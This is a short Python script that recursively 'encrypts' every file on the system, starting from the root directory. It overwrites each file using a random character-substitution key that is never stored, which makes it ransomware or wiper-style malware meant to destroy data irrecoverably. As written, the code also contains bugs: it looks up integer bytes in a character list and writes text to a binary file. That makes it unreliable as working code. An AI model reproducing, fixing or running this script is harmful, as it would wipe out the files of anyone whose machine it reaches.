#!/usr/bin/python3

import string
import random
import pathlib
import sys
import os

path = '/'

# Encrypts a file by shuffling the characters in the file
def encrypt_file(file):
        char = list(" " + string.ascii_letters + string.digits + string.punctuation)
        key = char.copy()
        random.shuffle(key)
        try:
                with open(file, 'rb') as r_file:
                        data = r_file.read()
                encrypt_text = ''
                for letter in data:
                        index = char.index(letter)
                        encrypt_text += key[index]
                with open(file, 'wb') as w_file:
                        w_file.write(encrypt_text)
                        print(f'{file} encrypt')
        except PermissionError:
                pass

# Encrypts all files in a folder and its subfolders
def encrypt_folder(path=path):
        for file in pathlib.Path(path).glob('*'):
                if os.path.isfile(file):
                        encrypt_file(file)
                else:
                        encrypt_folder(file)

encrypt_folder()
